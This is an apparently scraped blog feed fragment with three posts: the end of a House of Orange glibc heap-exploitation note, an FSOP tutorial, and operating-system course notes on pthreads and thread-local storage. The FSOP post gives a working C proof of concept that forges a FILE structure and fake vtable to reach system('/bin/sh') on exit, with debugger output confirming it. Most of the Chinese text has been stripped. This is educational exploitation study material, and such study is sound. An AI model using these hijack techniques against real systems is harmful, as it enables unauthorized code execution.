0x00007ffff7dd2520 ***</span><br><span class="line">======= Backtrace: =========</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6(+0x777f5)[0x7ffff7a847f5]</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6(+0x8215e)[0x7ffff7a8f15e]</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7ffff7a911d4]</span><br><span class="line">./house_of_orange[0x4007d8]</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7ffff7a2d840]</span><br><span class="line">./house_of_orange[0x4005d9]</span><br><span class="line">======= Memory map: ========</span><br><span class="line">00400000-00401000 r-xp 00000000 00:2f 82                                 /mnt/hgfs/Share/how2heap/glibc_2.23/house_of_orange</span><br><span class="line">00600000-00601000 r--p 00000000 00:2f 82                                 /mnt/hgfs/Share/how2heap/glibc_2.23/house_of_orange</span><br><span class="line">00601000-00602000 rw-p 00001000 00:2f 82                                 /mnt/hgfs/Share/how2heap/glibc_2.23/house_of_orange</span><br><span class="line">00602000-00645000 rw-p 00000000 00:00 0                                  [heap]</span><br><span class="line">7ffff0000000-7ffff0021000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff0021000-7ffff4000000 ---p 00000000 00:00 0 </span><br><span class="line">7ffff77f7000-7ffff780d000 r-xp 00000000 08:01 790524                     /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">7ffff780d000-7ffff7a0c000 ---p 00016000 08:01 790524                     /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">7ffff7a0c000-7ffff7a0d000 rw-p 00015000 08:01 790524                     /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">7ffff7a0d000-7ffff7bcd000 r-xp 00000000 08:01 791392                     /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">7ffff7bcd000-7ffff7dcd000 ---p 001c0000 08:01 791392                     /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">7ffff7dcd000-7ffff7dd1000 r--p 001c0000 08:01 791392                     /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">7ffff7dd1000-7ffff7dd3000 rw-p 001c4000 08:01 791392                     /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">7ffff7dd3000-7ffff7dd7000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff7dd7000-7ffff7dfd000 r-xp 00000000 08:01 791384                     /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">7ffff7fdc000-7ffff7fdf000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff7ff6000-7ffff7ff7000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff7ff7000-7ffff7ffa000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">7ffff7ffc000-7ffff7ffd000 r--p 00025000 08:01 791384                     /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">7ffff7ffd000-7ffff7ffe000 rw-p 00026000 08:01 791384                     /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">whoami</span></span></span><br><span class="line">grxer</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>houseoforange%50</p><p>_IO_flush_all_lockp_IO_list_allchainmain_arena+88 main_arena+88+0xc0_mode</p><p>libc00xffffffff0x7fffffff</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br></pre></td></tr></table></figure><p><code>(fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</code>vtablevtable</p><p><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> House Of Orange </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FSOP</title>
      <link href="/2023/04/06/FSOP/"/>
      <url>/2023/04/06/FSOP/</url>
      
        <content type="html"><![CDATA[<h2 id="File-Stream-Oriented-Programming"><a href="#File-Stream-Oriented-Programming" class="headerlink" title="File Stream Oriented Programming"></a>File Stream Oriented Programming</h2><p>FSOPlibc_chain_IO_list_all_IO_FILE vtable</p><p>exit()_IO_flush_all_lockp,</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">           || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">               &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">           )</span><br><span class="line">          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure><p>_IO_flush_all_lockp</p><ol><li><p> libc  abort </p></li><li><p> exit </p></li><li><p> main (exit)</p></li></ol><p>_IO_FILE</p><ul><li>fp-&gt;_mode &lt;&#x3D; 0</li><li>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_list_all 0x7ffff7dd2520</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mode_offset 0xc0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> writeptr_offset 0x28</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> writebase_offset 0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> vtable_offset 0xd8</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sh</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> *list_all_ptr;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span>*)((<span class="type">long</span> <span class="type">long</span>)ptr+mode_offset)=<span class="number">0x0</span>;</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span>*)((<span class="type">long</span> <span class="type">long</span>)ptr+writeptr_offset)=<span class="number">0x1</span>;</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span>*)((<span class="type">long</span> <span class="type">long</span>)ptr+writebase_offset)=<span class="number">0x0</span>;</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span>*)((<span class="type">long</span> <span class="type">long</span>)ptr+vtable_offset)=((<span class="type">long</span> <span class="type">long</span>)ptr+<span class="number">0x100</span>);</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span>*)((<span class="type">long</span> <span class="type">long</span>)ptr+<span class="number">0x100</span>+<span class="number">24</span>)=sh;</span><br><span class="line"></span><br><span class="line">    list_all_ptr=(<span class="type">long</span> <span class="type">long</span> *)_IO_list_all;</span><br><span class="line"></span><br><span class="line">    list_all_ptr[<span class="number">0</span>]=ptr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p _IO_list_all</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = (struct _IO_FILE_plus *) 0x602010</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p *(struct _IO_FILE_plus *) 0x602010</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = &#123;</span></span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 0, </span><br><span class="line">    _IO_read_ptr = 0x0, </span><br><span class="line">    _IO_read_end = 0x0, </span><br><span class="line">    _IO_read_base = 0x0, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x1 &lt;error: Cannot access memory at address 0x1&gt;, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x0, </span><br><span class="line">    _offset = 0, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x0, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = 0, </span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x602110</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p *(struct _IO_jump_t*)0x602110</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3 = &#123;</span></span><br><span class="line">  __dummy = 0, </span><br><span class="line">  __dummy2 = 0, </span><br><span class="line">  __finish = 0x0, </span><br><span class="line">  __overflow = 0x4005b6 &lt;sh&gt;, </span><br><span class="line">  __underflow = 0x0, </span><br><span class="line">  __uflow = 0x0, </span><br><span class="line">  __pbackfail = 0x0, </span><br><span class="line">  __xsputn = 0x0, </span><br><span class="line">  __xsgetn = 0x0, </span><br><span class="line">  __seekoff = 0x0, </span><br><span class="line">  __seekpos = 0x0, </span><br><span class="line">  __setbuf = 0x0, </span><br><span class="line">  __sync = 0x0, </span><br><span class="line">  __doallocate = 0x0, </span><br><span class="line">  __read = 0x0, </span><br><span class="line">  __write = 0x0, </span><br><span class="line">  __seek = 0x0, </span><br><span class="line">  __close = 0x0, </span><br><span class="line">  __stat = 0x0, </span><br><span class="line">  __showmanyc = 0x0, </span><br><span class="line">  __imbue = 0x0</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p sh</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">4 = &#123;void ()&#125; 0x4005b6 &lt;sh&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2023/04/06/FSOP/image-20230406132711374.png" alt="image-20230406132711374"></p><p><img src="/2023/04/06/FSOP/image-20230406132733192.png" alt="image-20230406132733192"></p>]]></content>
      
      
      
        <tags>
            
            <tag> FSOP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NJUOS:</title>
      <link href="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/"/>
      <url>/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p><a href="http://jyywiki.cn/OS/2022/slides/3.slides#">http://jyywiki.cn/OS/2022/slides/3.slides#</a></p><h2 id="thread-h--API"><a href="#thread-h--API" class="headerlink" title="thread.h  API"></a><code>thread.h</code>  API</h2><p>linuxLWP(light weight process)Linux</p><p> <a href="https://grxer.github.io/2023/03/26/TLS-Hijack/">https://grxer.github.io/2023/03/26/TLS-Hijack/</a> </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdatomic.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NTHREAD 64</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> T_FREE = <span class="number">0</span>, T_LIVE, T_DEAD, &#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> id, status;</span><br><span class="line">  <span class="type">pthread_t</span> thread;</span><br><span class="line">  <span class="type">void</span> (*entry)(<span class="type">int</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread</span> <span class="title">tpool</span>[<span class="title">NTHREAD</span>], *<span class="title">tptr</span> =</span> tpool;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">wrapper</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">thread</span> =</span> (<span class="keyword">struct</span> thread *)arg;</span><br><span class="line">  thread-&gt;entry(thread-&gt;id);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create</span><span class="params">(<span class="type">void</span> *fn)</span> &#123;</span><br><span class="line">  assert(tptr - tpool &lt; NTHREAD);</span><br><span class="line">  *tptr = (<span class="keyword">struct</span> thread) &#123;</span><br><span class="line">    .id = tptr - tpool + <span class="number">1</span>,</span><br><span class="line">    .status = T_LIVE,</span><br><span class="line">    .entry = fn,</span><br><span class="line">  &#125;;</span><br><span class="line">  pthread_create(&amp;(tptr-&gt;thread), <span class="literal">NULL</span>, wrapper, tptr);</span><br><span class="line">  ++tptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">join</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NTHREAD; i++) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">t</span> =</span> &amp;tpool[i];</span><br><span class="line">    <span class="keyword">if</span> (t-&gt;status == T_LIVE) &#123;</span><br><span class="line">      pthread_join(t-&gt;thread, <span class="literal">NULL</span>);</span><br><span class="line">      t-&gt;status = T_DEAD;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((destructor)) <span class="type">void</span> <span class="title function_">cleanup</span><span class="params">()</span> &#123; </span><br><span class="line">  join();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>POSIXmain</p><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_create</span><span class="params">(</span></span><br><span class="line"><span class="params">                 <span class="type">pthread_t</span> * tidp,   <span class="comment">//ID</span></span></span><br><span class="line"><span class="params">                 <span class="type">const</span> <span class="type">pthread_attr_t</span> * attr,  <span class="comment">//</span></span></span><br><span class="line"><span class="params">                 <span class="type">void</span> *(*start_rtn)(<span class="type">void</span> *), <span class="comment">//start_rtn,</span></span></span><br><span class="line"><span class="params">                 <span class="type">void</span> * arg <span class="comment">//arg</span></span></span><br><span class="line"><span class="params">                  )</span>;<span class="comment">//00</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="type">pthread_t</span>tibp,ID</span><br><span class="line">pthread_create</span><br><span class="line">pthread_join</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_detach</span><span class="params">(<span class="type">pthread_t</span> tid)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_join</span><span class="params">(<span class="type">pthread_t</span> thread, <span class="comment">//</span></span></span><br><span class="line"><span class="params">                 <span class="type">void</span> ** retval<span class="comment">//</span></span></span><br><span class="line"><span class="params">                )</span>;<span class="comment">//00</span></span><br><span class="line"></span><br><span class="line"> pthread_join() ()join()</span><br></pre></td></tr></table></figure></blockquote></li><li><p>_attribute__</p></li><li><p>pthread -lpthreadpthreadLinux</p><blockquote><p>-lpthread  pthread </p><p>-pthread  pthread , -lpthread  pthread </p></blockquote></li></ul><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>strace</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mmap(NULL, 8392704, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0) = 0x7ffff73ff000</span><br><span class="line">mprotect(0x7ffff7400000, 8388608, PROT_READ|PROT_WRITE) = 0</span><br><span class="line">getrandom(&quot;\x5c\xf7\x7d\x5a\x8a\x60\xbd\x73&quot;, 8, GRND_NONBLOCK) = 8</span><br><span class="line">brk(NULL)                               = 0x555555559000</span><br><span class="line">brk(0x55555557a000)                     = 0x55555557a000</span><br><span class="line">rt_sigprocmask(SIG_BLOCK, ~[], [], 8)   = 0</span><br><span class="line">clone3(&#123;flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, child_tid=0x7ffff7bff910, parent_tid=0x7ffff7bff910, exit_signal=0, stack=0x7ffff73ff000, stack_size=0x7fff00, tls=0x7ffff7bff640&#125;gr</span><br><span class="line"> =&gt; &#123;parent_tid=[8670]&#125;, 88) = 8670</span><br></pre></td></tr></table></figure><p>gdbclong3syscall</p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404215319891.png" alt="image-20230404215319891"></p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404215306823.png" alt="image-20230404215306823"></p><h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><p><a href="https://sourceware.org/gdb/onlinedocs/gdb/Threads.html">https://sourceware.org/gdb/onlinedocs/gdb/Threads.html</a></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;thread.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">__thread <span class="type">char</span> *base, *cur; <span class="comment">// thread-local variables</span></span><br><span class="line">__thread <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line"><span class="comment">// objdump to see how thread-local variables are implemented</span></span><br><span class="line">__attribute__((noinline)) <span class="type">void</span> <span class="title function_">set_cur</span><span class="params">(<span class="type">void</span> *ptr)</span> &#123; cur = ptr; &#125;</span><br><span class="line">__attribute__((noinline)) <span class="type">char</span> *<span class="title function_">get_cur</span><span class="params">()</span>         &#123; <span class="keyword">return</span> cur; &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">stackoverflow</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">  set_cur(&amp;n);</span><br><span class="line">  <span class="keyword">if</span> (n % <span class="number">1024</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="type">int</span> sz = base - get_cur();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack size of T%d &gt;= %d KB\n&quot;</span>, id, sz / <span class="number">1024</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  stackoverflow(n + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Tprobe</span><span class="params">(<span class="type">int</span> tid)</span> &#123;</span><br><span class="line">  id = tid;</span><br><span class="line">  base = (<span class="type">void</span> *)&amp;tid;</span><br><span class="line">  stackoverflow(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    create(Tprobe);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>TprobetidbaseStackOverflow</p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404185540104.png" alt="image-20230404185540104"></p><p>nrbp-0x241024nstackoverflow</p><p>pipe sort</p><p><code>./stack-probe | sort -nk 6</code></p><ul><li>-k</li><li>-n</li></ul><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404195902138.png" alt="image-20230404195902138"></p><p>8M</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>,,</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">show</span><span class="params">(<span class="type">void</span>* ptr)</span> &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, <span class="string">&quot;grxer&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;grxer&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">10</span>] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, name);</span><br><span class="line">    <span class="type">pthread_t</span> id;</span><br><span class="line">    pthread_create(&amp;id, <span class="literal">NULL</span>, show,(<span class="type">void</span>*) name);</span><br><span class="line">    pthread_join(id, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  %s&quot;</span>, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/N/p3&gt; gcc -g -o  test test.c -pthread</span><br><span class="line">grxer@grxer ~/D/s/N/p3&gt; ./test</span><br><span class="line">hello  grxer    </span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title="?"></a>?</h3><blockquote><p>pthread_create</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Data structure for condition variable handling.  The structure of</span></span><br><span class="line"><span class="comment">   the attribute type is not exposed on purpose.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> __size[__SIZEOF_PTHREAD_CONDATTR_T];</span><br><span class="line">  <span class="type">int</span> __align;</span><br><span class="line">&#125; <span class="type">pthread_condattr_t</span>;</span><br></pre></td></tr></table></figure><p>api</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pthread_attr_init</span><span class="params">(<span class="type">pthread_attr_t</span> *attr)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_attr_getstacksize</span><span class="params">(<span class="type">pthread_attr_t</span> *attr, <span class="type">size_t</span> *stacksize)</span>; </span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_attr_setstacksize</span><span class="params">(<span class="type">pthread_attr_t</span> *attr, <span class="type">size_t</span> stacksize)</span>;</span><br><span class="line"><span class="number">0</span><span class="number">-1</span>stacksizebyte</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pthread_t</span> id;</span><br><span class="line">    <span class="type">pthread_attr_t</span> thread_attr;</span><br><span class="line">    <span class="type">size_t</span> stacksize;</span><br><span class="line">    <span class="type">int</span> res = pthread_attr_init(&amp;thread_attr);</span><br><span class="line">    assert(!res);</span><br><span class="line">    res = pthread_attr_getstacksize(&amp;thread_attr, &amp;stacksize);</span><br><span class="line">    assert(!res);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;before:%zu\n&quot;</span>, stacksize);</span><br><span class="line">    res = pthread_attr_setstacksize(&amp;thread_attr,<span class="number">10485760</span>);</span><br><span class="line">    assert(!res);</span><br><span class="line">    res = pthread_attr_getstacksize(&amp;thread_attr, &amp;stacksize);</span><br><span class="line">    assert(!res);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;after:%zu\n&quot;</span>, stacksize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">grxer@grxer ~/D/s/N/p3&gt; ./test</span><br><span class="line">before:<span class="number">8388608</span></span><br><span class="line">after:<span class="number">10485760</span></span><br></pre></td></tr></table></figure><p><code>thread.h</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">pthread_attr_t</span> thread_attr;</span><br><span class="line"> <span class="type">int</span> res = pthread_attr_init(&amp;thread_attr);</span><br><span class="line"> assert(!res);</span><br><span class="line"> res = pthread_attr_setstacksize(&amp;thread_attr, <span class="number">10485760</span>);</span><br><span class="line"> assert(!res);</span><br><span class="line"> pthread_create(&amp;(tptr-&gt;thread), &amp;thread_attr, wrapper, tptr);</span><br></pre></td></tr></table></figure><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404203402253.png" alt="image-20230404203402253"></p></blockquote><h3 id="thread"><a href="#thread" class="headerlink" title="__thread"></a>__thread</h3><p><strong>Thread Local Storage</strong>tlsbypass canary</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get_cur</span><br><span class="line">.text:0000000000001388 55                            push    rbp</span><br><span class="line">.text:0000000000001389 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:000000000000138C 64 48 8B 04 25 F0 FF FF FF    mov     rax, fs:0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:0000000000001395 5D                            pop     rbp</span><br></pre></td></tr></table></figure><p>fs8086cs ss ds es20()</p><p><strong>fs</strong></p><p>&gt;&gt;&gt;</p><p>&gt;&gt;&gt;<a href="https://www.onitroad.com/jc/linux/man-pages/linux/man2/arch_prctl.2.html">int arch_prctl(int code, unsigned long *addr)</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 